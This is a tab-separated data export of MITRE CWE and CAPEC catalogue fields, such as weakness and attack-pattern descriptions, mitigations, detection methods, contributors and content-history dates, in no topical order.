23021	23	Weaknesses in this category are related to schemes that generate numbers or identifiers that are more predictable than required by the application.
12910	100	The MITRE Corporation
14889	81	Access Control
24524	76	2019-04-04
12405	28	CWE Content Team
8027	62	updated Common_Consequences, Demonstrative_Examples, Relationships
21785	62	updated Description, Name, Type
17562	89	Detailed
25382	70	OWASP
22009	23	The software receives input from an upstream component, but it does not neutralize or incorrectly neutralizes code syntax before using the input in a dynamic evaluation call (e.g. "eval").
18684	96	2008-01-18
20734	44	SOAR Partial
14680	28	CWE Content Team
5789	35	Cigital
5624	54	Medium
20657	81	Confidentiality
21218	28	CWE Content Team
13319	39	2019-01-03
18795	28	Eric Dalci
16422	97	Action Spoofing
23661	100	The MITRE Corporation
6407	91	Implementation
11910	39	2019-01-03
25391	56	ChildOf
24103	79	Confidentiality
20218	77	Automated Static Analysis - Source Code
18039	35	MITRE
16589	50	Application designers can wrap application functionality (preferably through the underlying framework) in an output encoding scheme that obscures or cleanses error messages to prevent such attacks. Such a technique is often used in conjunction with the above 'code book' suggestion.
15685	62	updated References, Relationships, Taxonomy_Mappings
11212	23	The software uses external input to construct a pathname that should be within a restricted directory, but it does not properly neutralize absolute path sequences such as "/abs/path" that can resolve to a location that is outside of that directory.
10672	57	Indirect
24023	74	1
12846	28	CWE Content Team
19794	81	Confidentiality
17924	39	2011-03-29
10921	33	Gary McGraw
8153	28	CWE Content Team
10426	62	updated Potential_Mitigations
18332	24	MITRE
8152	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
16845	49	2017
10918	103	Primary
17484	35	MITRE
20737	76	2019-04-04
17579	23	The PHP application uses an old method for processing uploaded files by referencing the four global variables that are set for each file (e.g. $varname, $varname_size, $varname_name, $varname_type). These variables could be overwritten by attackers, causing the application to process unauthorized files.
11455	25	High
14101	23	The software uses a data element that has an excessively large      number of sub-elements with non-primitive data types such as structures or aggregated objects.
14685	62	updated Demonstrative_Examples
16993	62	updated Potential_Mitigations
11897	50	Design: Validate all input for content including files. Ensure that if files and remote content must be accepted that once accepted, they are placed in a sandbox type location so that lower assurance clients cannot write up to higher assurance processes (like Web server processes for example)
6243	39	2011-03-29
20656	28	CWE Content Team
25148	39	2011-06-01
19647	33	Mathias Bynens
15487	76	2018-07-31
19542	35	MITRE
7824	35	MITRE
14411	27	A terrestrial satellite jammer with a signal more powerful than that of the satellite attempting to communicate with the target.                The adversary must know the location of the target satellite dish.
19685	35	MITRE
9605	35	MITRE
5641	62	updated Potential_Mitigations
6998	35	MITRE
22171	39	2014-07-30
14013	56	ChildOf
13293	45	Base
20741	72	The code could be left in a bad state.
6071	39	2017-11-08
15466	35	MITRE
7162	40	The ability to monitor and interact with network communications.Access to at least one host, and the privileges to interface with the network interface card.
6148	43	Simple
9966	89	Meta
14532	74	1
10677	39	2012-10-30
18855	39	2010-12-13
17886	62	updated Relationships
11597	71	1981
12928	46	This weakness is not about regexp complexity. Rather It is about a regular expression that does not match all values that are intended. Consider the use of a regexp to whitelist acceptable values or to blacklist unwanted terms. An overly restrictive regexp misses some potentially security-relevant values leading to either false positives *or* false negatives, depending on how the regexp is being used within the code. Consider the expression /[0-8]/ where the intention was /[0-9]/.  This expression is not “complex” but the value “9” is not matched when maybe the programmer planned to check for it.
19861	62	updated Related_Attack_Patterns, Relationships
13654	28	CWE Content Team
24545	91	Implementation
15849	35	MITRE
11630	103	Primary
15260	28	CWE Content Team
12895	78	Medium
21551	23	The software performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses.
16400	39	2008-09-08
15676	63	DoS: Crash, Exit, or Restart
16633	90	Language-Independent
10320	62	updated Relationships, Weakness_Ordinalities
16864	80	An attacker needs to understand alternate encodings, what the filter looks for and the data format acceptable to the target API
10947	43	Simple
6916	61	Draft
14095	62	updated Relationships
23636	33	Paget
6827	59	Updated Attack_Phases
17258	97	Scanning for Vulnerable Software
11970	33	Gregory Baatard
7521	35	MITRE
6149	28	CWE Content Team
18493	55	CAPEC Content Team
13995	28	CWE Content Team
19943	28	CWE Content Team
17507	62	updated Common_Consequences
10528	56	CanPrecede
17216	62	updated Description, Potential_Mitigations
10370	36	https://www.owasp.org/index.php/Cross_Frame_Scripting
25421	26	Architecture and Design
7599	62	updated Description
18859	45	Base
16826	62	updated Detection_Factors, Relationships, Taxonomy_Mappings
23553	103	Primary
14611	23	An attacker removes or modifies the logic on a client associated with monetary calculations resulting in incorrect information being sent to the server. A server may rely on a client to correctly compute monetary information. For example, a server might supply a price for an item and then rely on the client to correctly compute the total cost of a purchase given the number of items the user is buying. If the attacker can remove or modify the logic that controls these calculations, they can return incorrect values to the server. The attacker can use this to make purchases for a fraction of the legitimate cost or otherwise avoid correct billing for activities.
20161	59	Updated Description Summary
19638	35	MITRE
20060	100	The MITRE Corporation
18470	28	CWE Content Team
13297	28	CWE Content Team
21089	39	2012-10-30
6218	54	High
19026	62	updated Potential_Mitigations
9346	89	Standard
20446	39	2008-09-08
19678	28	CWE Content Team
5792	31	1003
24854	28	CWE Content Team
9111	39	2009-10-29
15703	101	CAPEC Content Team
11970	86	http://ro.ecu.edu.au/cgi/viewcontent.cgi?article=1174&context=ecuworks2012
19820	101	CAPEC Content Team
10795	23	The software reads from a buffer using buffer access mechanisms such as indexes or pointers that reference memory locations after the targeted buffer.
11613	61	Stable
7038	28	CWE Content Team
8123	89	Detailed
23603	62	updated Description
24657	51	2015-11-09
11130	39	2010-12-13
22020	35	MITRE
9346	50	Scan your services and disable the ones which are not needed and are exposed unnecessarily. Exposing programs increases the attack surface. Only expose the services which are needed and have security mechanisms such as authentication built around them.
13793	86	http://www.eweek.com/c/a/Security/Microsoft-Scraps-Old-Encryption-in-New-Code/
23250	39	2009-01-12
19327	39	2010-02-16
13679	27	None: No specialized resources are required to execute this type of attack. The adversary needs to be able to latch onto a privileged thread.                The adversary does, however, need to be able to program, compile, and link to the victim binaries being executed so that it will turn control of a privileged thread over to the adversary's malicious code. This is the case even if the adversary conducts the attack remotely.
7910	103	Primary
7893	62	updated Time_of_Introduction
8589	39	2008-09-08
21352	56	ChildOf
24381	81	Integrity
10228	67	Medium
15277	103	Primary
9216	21	CWE Content Team
17094	81	Availability
7559	62	updated Applicable_Platforms, Common_Consequences, Demonstrative_Examples, Description, Relationships, Time_of_Introduction
18889	33	Rain Forest Puppy
8518	28	CWE Content Team
7595	103	Primary
23631	95	[Abuse the Victim's Session] Takeover the fixated session: Once the victim has achieved a higher level of privilege, possibly by logging into the application, the attacker can now take over the session using the fixated session identifier.
6465	51	2014-06-23
10750	39	2008-09-08
21635	39	2010-12-13
25091	62	updated Potential_Mitigations, References
12495	39	2017-11-08
21799	78	High
10128	53	The MITRE Corporation
6224	28	CWE Content Team
11182	38	Traffic filtering with IDS (or proxy) can detect requests with suspicious URLs. IDS may use signature based identification to reveal such URL based attacks.
20890	53	The MITRE Corporation
22376	62	updated Likelihood_of_Exploit, Relationships
10316	55	CAPEC Content Team
6176	53	The MITRE Corporation
18160	81	Availability
24111	39	2012-10-30
7915	39	2019-09-23
21551	88	Execution with Unnecessary Privileges
20551	39	2009-10-29
24193	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   With a stateless protocol such as HTTP, use a framework that maintains the state for you.                   Examples include ASP.NET View State [REF-756] and the OWASP ESAPI Session Management feature [REF-45].                   Be careful of language features that provide state support, since these might be provided as a convenience to the programmer and may not be considering security.
19074	26	Implementation
19151	39	2008-07-01
21590	23	Integer coercion refers to a set of flaws pertaining to the type casting, extension, or truncation of primitive data types.
21170	39	2014-07-30
14368	28	CWE Content Team
12710	35	MITRE
25368	73	Manual testing of possible inputs with attack data.
15281	79	Availability
18647	63	Execute Unauthorized Code or Commands
10114	47	Modify Data
15452	28	CWE Content Team
25329	26	Implementation
12394	91	Architecture and Design
18837	33	Microsoft Corporation
11783	31	699
12665	70	Non-alphanumeric XSS cheat sheet
13212	102	ChildOf
25194	81	Availability
24882	27	A tool capable of sending/receiving UDP datagram packets from a remote system to a closed port and receive an ICMP Error Message Type 3, "Port Unreachable..
18384	55	CAPEC Content Team
8529	43	Simple
12978	50	Ensure good compartmentalization in the system to provide protected areas that can be trusted.
10260	35	MITRE
22329	35	MITRE
13816	100	The MITRE Corporation
18508	73	Manually inject various script payloads into each identified entry point using a list of common script injection probes that typically work in a client-side non-script elements context and observe system behavior to determine if script was executed. Since these probes may have to be injected in many different types of non-script elements, they should cover a variety of possible contexts (CSS, HTML tag, XML, etc.).
21328	93	Defense in Depth
11187	50	Design: Use an abstraction library to abstract away risky APIs. Not a complete solution.
21350	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Formal Methods / Correct-By-Construction                                                                     Cost effective for partial coverage:                                                                           Inspection (IEEE 1028 standard) (can apply to requirements, design, source code, etc.)
15470	35	MITRE
8856	62	updated Relationships, Taxonomy_Mappings
13690	43	Simple
25357	39	2014-07-30
12491	100	The MITRE Corporation
20515	39	2008-09-08
15573	39	2011-03-29
9224	33	Gary McGraw
24480	35	MITRE
6100	92	Experiment
19863	26	Architecture and Design
19344	39	2009-10-29
16618	39	2011-06-01
13608	35	MITRE
5616	62	updated Common_Consequences, Relationships
23761	39	2010-06-21
15225	62	updated Applicable_Platforms, Causal_Nature, Common_Consequences, Demonstrative_Examples, Modes_of_Introduction, Relationships
15699	85	245
7866	76	2019-09-30
15602	102	ChildOf
17039	43	Simple
17609	96	2009-07-02
8470	63	Execute Unauthorized Code or Commands
17987	39	2012-10-30
24402	56	CanPrecede
24721	24	MITRE
9568	42	If at all possible, use library calls rather than external processes to recreate the desired functionality.
18784	28	CWE Content Team
18617	27	Spidering tools to explore the target web site are extremely useful in this attack especially when attacking large sites. Some tools might also be able to automatically construct common page locations from known paths.
12181	91	Architecture and Design
13519	85	492
12160	50	Design: Build throttling mechanism into the resource allocation. Provide for a timeout mechanism for allocated resources whose transaction does not complete within a specified interval.
10139	69	Incomplete
23022	28	CWE Content Team
8782	27	The attacker must be able to corrupt the infrastructure used by the client. For some variants of this attack, the attacker must be able to stand up their own services that mimic the services the targeted client intends to use.
7237	39	2008-09-08
20319	39	2009-07-27
22441	42	If a technique that requires extra computational effort can not be implemented, then for each password that is processed, generate a new random salt using a strong random number generator with unpredictable seeds. Add the salt to the plaintext password before hashing it. When storing the hash, also store the salt. Do not use the same salt for every password.
25352	35	Cigital
7175	28	Eric Dalci
23331	26	Architecture and Design
23838	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
8610	31	1000
7048	31	1000
15188	95	[Determine user-controllable input susceptible to LDAP injection] For each user-controllable input that the attacker suspects is vulnerable to LDAP injection, attempt to inject characters that have special meaning in LDAP (such as a single quote character, etc.). The goal is to create a LDAP query with an invalid syntax
6724	39	2019-06-20
6689	62	updated Relationships, Taxonomy_Mappings
13032	52	This weakness can be detected using tools and techniques that require manual (human) analysis, such as penetration testing, threat modeling, and interactive tools that allow the tester to record and modify an active session.
13753	62	updated Time_of_Introduction
24267	25	High
12094	35	MITRE
17570	62	updated Description, Name
19288	46	This issue can make the software perform more slowly.  If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.
10852	24	MITRE
13418	100	The MITRE Corporation
16543	46	This issue is particularly important in the case of switch statements that involve fall-through style case statements - ie., those which do not end with break. If the variable being tested by the switch changes in the course of execution, this could change the intended logic of the switch so much that it places the process in a contradictory state and in some cases could even result in memory corruption.
13546	63	Read Application Data
22898	28	CWE Content Team
8760	35	Cigital
19132	35	MITRE
9773	39	2009-10-29
23404	76	2018-07-31
14615	100	The MITRE Corporation
8027	39	2012-05-11
14857	53	The MITRE Corporation
21257	91	Architecture and Design
15827	90	C
16538	100	The MITRE Corporation
18512	62	updated Applicable_Platforms, Relationships
12703	61	Draft
23102	62	updated Common_Consequences
22206	35	MITRE
8315	91	Implementation
20089	43	Simple
24039	48	05
9136	62	updated References, Relationships, Taxonomy_Mappings
18322	62	added/updated demonstrative examples
21914	36	http://en.wikipedia.org/wiki/UTF-8
13426	45	Variant
6906	28	CWE Content Team
20947	39	2014-07-30
22305	73	An attacker creates an account with the target system and observes requests and the corresponding JSON responses from the server. Understanding how to properly elicit responses from the server is crucial to the attackers' ability to craft the exploit.
5719	80	Knowledge of general SQL injection techniques and subtleties of the ORM framework is needed
21810	63	Execute Unauthorized Code or Commands
6585	62	updated Relationships
19711	101	CAPEC Content Team
17899	100	The MITRE Corporation
9000	62	updated Common_Consequences, Description, Name, Potential_Mitigations, References, Relationships
24269	62	updated Common_Consequences, Relationships
24969	91	Architecture and Design
7516	97	Malicious Logic Insertion into Product Software via Configuration Management Manipulation
20943	78	Low
11864	72	An attacker could easily guess the values used. This could lead to unauthorized access to a system if the seed is used for authentication and authorization.
13942	39	2011-06-27
17957	101	CAPEC Content Team
18137	85	41
18200	92	Explore
6864	76	2015-12-07
7811	27	None: No specialized resources are required to execute this type of attack.
20860	25	Medium
10597	91	Architecture and Design
14798	34	These are typically reported for temporary files or privileged programs.
21829	21	PLOVER
21133	88	Predictable Exact Value from Previous Values
18131	95	The attacker opens a connection to the target server and sends it a challenge
19706	35	MITRE
10820	63	Read Application Data
14000	28	CWE Content Team
9831	31	1000
12249	62	updated Relationships, Taxonomy_Mappings
18476	103	Primary
10630	28	CWE Content Team
18507	40	User-controlled input used as part of HTTP header
16177	59	Updated Related_Attack_Patterns
25178	91	Implementation
5891	26	Architecture and Design
17598	35	MITRE
12019	45	Base
13593	39	2017-11-08
19667	81	Integrity
8567	56	ChildOf
20958	28	CWE Content Team
6109	35	MITRE
13834	56	ChildOf
7767	28	CWE Content Team
10622	89	Meta
10000	52	This weakness can be detected using dynamic tools and techniques that interact with the software using large test suites with many diverse inputs, such as fuzz testing (fuzzing), robustness testing, and fault injection. The software's operation may slow down, but it should not become unstable, crash, or generate incorrect results.                   Race conditions may be detected with a stress-test by calling the software simultaneously from a large number of threads or processes, and look for evidence of any unexpected behavior.                   Insert breakpoints or delays in between relevant code statements to artificially expand the race window so that it will be easier to detect.
14592	103	Primary
22578	103	Primary
22047	35	MITRE
20559	39	2011-06-01
5934	101	CAPEC Content Team
16061	77	Automated Static Analysis
24762	100	The MITRE Corporation
19362	62	updated Relationships, Taxonomy_Mappings
9865	62	updated Demonstrative_Examples, Relationships
9645	31	1000
12747	79	Confidentiality
11967	35	MITRE
18322	39	2008-07-01
8408	35	MITRE
10117	39	2014-07-30
16288	39	2019-01-03
21867	39	2008-07-01
20044	62	updated Applicable_Platforms, Modes_of_Introduction, Relationships
10193	50	Design: Use libraries and templates that minimize unfiltered input.
21608	73	The adversary leveraged Flash file overlay capabilities to craft a malicious clickjacking page
6235	100	The MITRE Corporation
24602	104	920
10744	96	2018-07-02
17596	21	PLOVER
15699	50	Design: Use libraries and templates that minimize unfiltered input.
16651	50	Design: Perform input white list validation on all XML input
14877	79	Integrity
10036	67	High
11281	35	Veracode
7053	45	Variant
15299	80	Understanding of the HTTP protocol and an ability to craft a malicious script
11802	31	699
21189	43	Simple
15113	76	2017-05-01
17605	43	Simple
24306	21	PLOVER
14506	43	Simple
20226	59	Updated Consequences
16136	39	2009-10-29
18390	85	612
5945	91	Testing
19562	35	MITRE
16104	95	An adversary crafts input data that may have an adverse effect on the operation of the XML parser when the data is parsed on the victim's system.
11378	79	Authorization
18931	59	Updated Description, Description Summary
5895	39	2008-07-01
22646	42	It is important to properly initialize CBC operating block ciphers or their utility is lost.
15277	56	ChildOf
13724	63	Read Memory
18277	81	Confidentiality
21742	47	Modify Data
9383	92	Explore
7344	28	Eric Dalci
17744	31	699
22872	103	Primary
13647	39	2011-06-01
20592	100	The MITRE Corporation
24002	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Compare binary / bytecode to application permission manifest
24067	28	CWE Content Team
17506	24	MITRE
21997	28	CWE Content Team
18031	39	2012-10-30
8307	40	An attacker must be able to reproduce behavior that would result in an account being locked.
6390	23	This attack relies on client side code to access local files and resources instead of URLs. When the client browser is expecting a URL string, but instead receives a request for a local file, that execution is likely to occur in the browser process space with the browser's authority to local files. The attacker can send the results of this request to the local files out to a site that they control. This attack may be used to steal sensitive authentication data (either local or remote), or to gain system profile information to launch further attacks.
6795	62	updated Time_of_Introduction
25063	62	updated Potential_Mitigations
6188	63	Quality Degradation
19587	28	CWE Content Team
21147	67	High
22191	81	Integrity
6210	56	ChildOf
23126	63	Varies by Context
18242	31	1000
5687	24	MITRE
23490	28	CWE Content Team
13712	77	Manual Static Analysis - Source Code
14346	28	CWE Content Team
21895	103	Primary
12485	62	updated Relationships
15282	56	ChildOf
13383	63	DoS: Crash, Exit, or Restart
24211	39	2011-06-01
22148	39	2012-10-30
14864	80	Requires the ability to write malicious scripts and embed them into HTTP requests.
18471	35	MITRE
12104	81	Integrity
24974	77	Manual Static Analysis - Binary or Bytecode
6457	40	The adversary requires logical access to the target's network in order to carry out this type of attack.
24773	62	updated Background_Details, Common_Consequences, Demonstrative_Examples, Description, Other_Notes
18951	50	Implementation: Remove all debug and testing options from production code.
11951	25	Medium
12507	74	1
5929	62	updated Description, Other_Notes
24206	31	1000
20927	68	This makes it easier to spot places in the code where data is being used that is unencrypted.
22821	70	Censorship in the Wild: Analyzing Internet Filtering in Syria
17502	91	Implementation
9346	40	This attack often requires communicating with the host target services directly. For instance Telnet may be enough to communicate with the host target.
16028	28	Eric Dalci
23219	102	ChildOf
19209	62	updated Potential_Mitigations
10806	63	Hide Activities
20119	69	Incomplete
14547	26	Architecture and Design
22315	35	MITRE
7863	39	2017-11-08
11642	69	Incomplete
9830	67	Medium
14893	69	Incomplete
12331	35	MITRE
22506	22	08
7425	39	2011-06-01
15829	39	2017-11-08
17488	74	3
10753	43	Simple
18064	62	updated Related_Attack_Patterns
22173	39	2009-12-28
20603	35	MITRE
20504	80	Ability to discover permissions on terminal devices. Of course, brute force can also be used.
17318	48	05
22828	35	MITRE
13666	53	The MITRE Corporation
13673	104	472
14055	93	High
13779	35	MITRE
23047	28	CWE Content Team
16764	23	An attacker initiates a series of events designed to cause a user, program, server, or device to perform actions which undermine the integrity of software code, device data structures, or device firmware, achieving the modification of the target's integrity to achieve an insecure state.
7446	35	Cigital
6053	39	2011-06-01
17662	42	Avoid making decisions based on names of resources (e.g. files) if those resources can have alternate names.
23501	81	Integrity
12938	55	CAPEC Content Team
5681	89	Detailed
9701	35	MITRE
6164	21	CWE Content Team
22166	33	NIST
14589	62	updated Demonstrative_Examples
11561	31	1000
14593	39	2008-07-01
13845	101	CAPEC Content Team
21887	35	MITRE
13081	77	Black Box
20263	62	updated Common_Consequences
16013	42	Run your code using the lowest privileges that are required to accomplish the necessary tasks [REF-76]. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.
22152	35	MITRE
10769	39	2015-12-07
17561	44	SOAR Partial
16331	62	updated Relationships
22057	50	Design: Configure the access control correctly.
8831	103	Primary
20700	69	Draft
17082	28	CWE Content Team
12424	31	699
8884	66	Dynamic-Link Library Search Order
23018	53	The MITRE Corporation
21232	39	2018-03-27
7886	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.                   When validating filenames, use stringent whitelists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses such as CWE-23, and exclude directory separators such as "/" to avoid CWE-36. Use a whitelist of allowable file extensions, which will help to avoid CWE-434.                   Do not rely exclusively on a filtering mechanism that removes potentially dangerous characters. This is equivalent to a blacklist, which may be incomplete (CWE-184). For example, filtering "/" is insufficient protection if the filesystem also supports the use of "\" as a directory separator. Another possible error could occur when the filtering is applied in a way that still produces dangerous data (CWE-182). For example, if "../" sequences are removed from the ".../...//" string in a sequential fashion, two instances of "../" would be removed from the original string, but the remaining characters would still form the "../" string.
7453	53	The MITRE Corporation
18709	49	2003
14586	33	Jeremy Manson and Brian Goetz
7306	104	410
8241	39	2011-06-27
20907	104	1067
11589	31	1000
10547	35	MITRE
21920	25	High
11843	42	If possible, prohibit the use of DTDs or use an XML parser that limits the expansion of recursive DTD entities.
13474	28	CWE Content Team
19954	66	Deserialize My Shorts: Or How I Learned to Start Worrying and Hate Java Object Deserialization
6020	51	2014-06-23
8503	77	Dynamic Analysis with Manual Results Interpretation
11444	52	For hard-coded credentials in incoming authentication: use monitoring tools that examine the software's process as it interacts with the operating system and the network. This technique is useful in cases when source code is unavailable, if the software was not developed by you, or if you want to verify that the build phase did not introduce any new weaknesses. Examples include debuggers that directly attach to the running process; system-call tracing utilities such as truss (Solaris) and strace (Linux); system activity monitors such as FileMon, RegMon, Process Monitor, and other Sysinternals utilities (Windows); and sniffers and protocol analyzers that monitor network traffic.                   Attach the monitor to the process and perform a login. Using call trees or similar artifacts from the output, examine the associated behaviors and see if any of them appear to be comparing the input to a fixed string or value.
21135	42	Always validate XML input against a known XML Schema or DTD.                   It is not possible for an XML parser to validate all aspects of a document's content because a parser cannot understand the complete semantics of the data. However, a parser can do a complete and thorough job of checking the document's structure and therefore guarantee to the code that processes the document that the content is well-formed.
16259	35	Cigital
10834	28	CWE Content Team
9006	23	The product uses a search path that contains an unquoted element, in which the element contains whitespace or other separators. This can cause the product to access resources in a parent path.
18476	56	ChildOf
16502	76	2017-08-04
20171	21	PLOVER
16953	35	MITRE
19736	28	CWE Content Team
25330	62	updated Potential_Mitigations
14420	39	2011-06-01
24355	39	2010-06-21
15717	74	2
15562	97	URL Encoding
7836	28	CWE Content Team
13134	97	Active OS Fingerprinting
16234	81	Availability
12031	21	CLASP
11964	44	SOAR Partial
20230	56	ChildOf
17841	69	Draft
16856	51	2014-06-23
22593	26	Implementation
17546	24	MITRE
5975	63	Other
23058	39	2017-11-08
12249	35	MITRE
15874	21	CWE Content Team
19181	28	CWE Content Team
24813	100	The MITRE Corporation
8666	39	2009-03-10
13992	23	In this attack, the adversary tries every possible value for a password until they succeed. A brute force attack, if feasible computationally, will always be successful because it will essentially go through all possible passwords given the alphabet used (lower case letters, upper case letters, numbers, symbols, etc.) and the maximum length of the password. A system will be particularly vulnerable to this type of an attack if it does not have a proper enforcement mechanism in place to ensure that passwords selected by users are strong passwords that comply with an adequate password policy. In practice a pure brute force attack on passwords is rarely used, unless the password is suspected to be weak. Other password cracking methods exist that are far more effective (e.g. dictionary attacks, rainbow tables, etc.). Knowing the password policy on the system can make a brute force attack more efficient. For instance, if the policy states that all passwords must be of a certain level, there is no need to check smaller candidates.
12604	39	2009-10-29
13589	28	CWE Content Team
17391	91	Implementation
8340	89	Detailed
8713	100	The MITRE Corporation
7927	39	2008-09-08
10167	59	Updated Related_Weaknesses
6219	63	Reduce Reliability
15729	63	Bypass Protection Mechanism
24579	28	CWE Content Team
20732	28	CWE Content Team
20555	35	MITRE
15769	39	2011-06-01
18825	39	2017-11-08
6041	59	Updated Attack_Phases, Attack_Prerequisites, Description Summary, Examples-Instances, Probing_Techniques, Resources_Required
19838	91	Architecture and Design
7611	62	updated Potential_Mitigations
17601	66	ShAnKaR: multiple PHP application poison NULL byte vulnerability
10459	40	This type of an attack requires the ability to generate a large amount of ICMP traffic to send to the target server.
18183	35	MITRE
13469	56	ChildOf
10832	35	MITRE
16778	66	Integral Security
21307	49	2009
14711	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Man-in-the-middle attack tool
10439	28	CWE Content Team
9587	62	updated Description, Enabling_Factors_for_Exploitation, Modes_of_Introduction, References, Relationships
21516	72	The program could be redirected to the wrong files, potentially triggering a crash or hang when the targeted file is too large or does not have the expected format.
18849	81	Other
22732	42	Use whitelists of variable names that can be extracted.
6374	39	2008-09-08
11228	60	30
22709	35	MITRE
12240	21	PLOVER
17401	61	Draft
13870	28	CWE Content Team
9735	35	Cigital
20312	39	2012-05-11
10482	104	179
14641	103	Primary
6885	60	01
8702	35	MITRE
8504	62	updated Relationships, Taxonomy_Mappings
8661	35	MITRE
14854	103	Primary
7475	50	Ensure that when parameter expansion happens in the code that the assumptions used to determine the resulting size of the parameter are accurate and that the new size of the parameter is visible to the whole system
6152	28	CWE Content Team
24793	39	2008-09-08
10490	80	This is a sophisticated attack, but detailed techniques are published in open literature.
13355	69	Incomplete
8417	35	MITRE
21089	28	CWE Content Team
16557	91	Implementation
14249	62	updated Relationships
11621	39	2018-03-27
13065	28	CWE Content Team
20591	63	Execute Unauthorized Code or Commands
12508	47	Bypass Protection Mechanism
20872	39	2008-09-08
12119	35	MITRE
13855	76	2017-05-01
7170	103	Primary
16931	62	updated Likelihood_of_Exploit, Relationships, Taxonomy_Mappings
13345	21	CWE Content Team
15395	103	Primary
13263	28	CWE Content Team
15739	91	Requirements
13984	33	Minaxi Gupta
21955	28	CWE Content Team
11046	28	CWE Content Team
24895	30	Gunter Ollmann
14944	47	Execute Unauthorized Commands
14399	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
24918	51	2014-06-23
12975	35	MITRE
12423	35	MITRE
17733	50	To mitigate this type of an attack, modern firewalls drop UDP traffic destined for closed ports, and unsolicited UDP reply packets. A variety of other countermeasures such as universal reverse path forwarding and remote triggered black holing(RFC3704) along with modifications to BGP like black hole routing and sinkhole routing(RFC3882) help mitigate the spoofed source IP nature of these attacks.
17610	59	Updated Related_Attack_Patterns
13755	24	MITRE
14404	60	08
18751	39	2008-08-01
17319	31	699
23635	91	Implementation
7620	28	CWE Content Team
17606	31	1000
13357	28	CWE Content Team
17977	28	CWE Content Team
6973	45	Base
19260	59	Updated Attack_Phases, References
15610	69	Draft
10016	39	2019-01-03
21589	56	ChildOf
19710	53	The MITRE Corporation
22256	27	A machine with sufficient resources for the job (e.g. CPU, RAM, HD). Applicable dictionaries are required. Also a password cracking tool or a custom script that leverages the dictionary database to launch the attack.
14975	53	The MITRE Corporation
7671	62	updated References, Relationships
19209	28	CWE Content Team
21238	54	Medium
14901	28	CWE Content Team
15768	103	Primary
13842	69	Incomplete
18676	26	Architecture and Design
19791	35	MITRE
24227	28	CWE Content Team
9224	99	Addison-Wesley
16679	59	Updated References, Related_Weaknesses
6157	53	The MITRE Corporation
11712	101	CAPEC Content Team
9273	72	In the context of privilege or permissions assignment, an incorrect calculation can provide an attacker with access to sensitive resources.
20442	60	06
19872	50	Implementation: Disable scripting languages such as JavaScript in browser
14520	26	Architecture and Design
16269	62	updated Detection_Factors, Relationships
17680	36	http://www.albionresearch.com/misc/urlencode.php
15345	35	MITRE
18191	70	Browser Security Handbook
16679	100	The MITRE Corporation
17680	32	Albion Research Ltd
22183	88	Improper Handling of Unexpected Data Type
14976	91	Architecture and Design
10107	39	2012-05-11
14052	45	Class
22337	35	Cigital
11234	28	CWE Content Team
17617	39	2009-03-10
11887	62	updated Other_Notes
24603	46	This is generally found in proxies, firewalls, anti-virus software, and other intermediary devices that monitor, allow, deny, or modify traffic based on how the client or server is expected to behave.
21092	23	An adversary uses full TCP connection attempts to determine if a port is open on the target system. The scanning process involves completing a 'three-way handshake' with a remote port, and reports the port as closed if the full handshake cannot be established. An advantage of TCP connect scanning is that it works against any TCP/IP stack. RFC 793 defines how TCP connections are established and torn down. TCP connect scanning commonly involves establishing a full connection, and then subsequently tearing it down, and therefore involves sending a significant number of packets to each port that is scanned. Compared to other types of scans, a TCP Connect scan is slow and methodical. This type of scanning causes considerable noise in system logs and can be spotted by IDS/IPS systems. TCP Connect scanning can detect when a port is open by completing the three-way handshake, but it cannot distinguish a port that is unfiltered with no service running on it from a port that is filtered by a firewall but contains an active service. Due to the significant volume of packets exchanged per port, TCP connect scanning can become very time consuming (performing a full TCP connect scan against a host can take multiple days). Generally, it is not used as a method for performing a comprehensive port scan, but is reserved for checking a short list of common ports.
23674	76	2019-04-04
21627	28	CWE Content Team
15068	39	2011-06-01
16643	28	CWE Content Team
20024	62	updated Relationships, Taxonomy_Mappings
5751	81	Integrity
5820	43	Simple
12317	61	Draft
11249	72	This error can often cause one to allocate a buffer that is much smaller than what is needed, leading to resultant weaknesses such as buffer overflows.
24517	35	MITRE
7441	101	CAPEC Content Team
24804	104	67
12056	72	Attackers can read sensitive information by accessing the unrestricted storage mechanism.
22764	39	2019-06-20
14610	39	2014-02-18
20538	31	1000
8552	42	Do not store sensitive information in persistent cookies.
15754	35	MITRE
18011	31	1000
9741	28	CWE Content Team
11596	69	Incomplete
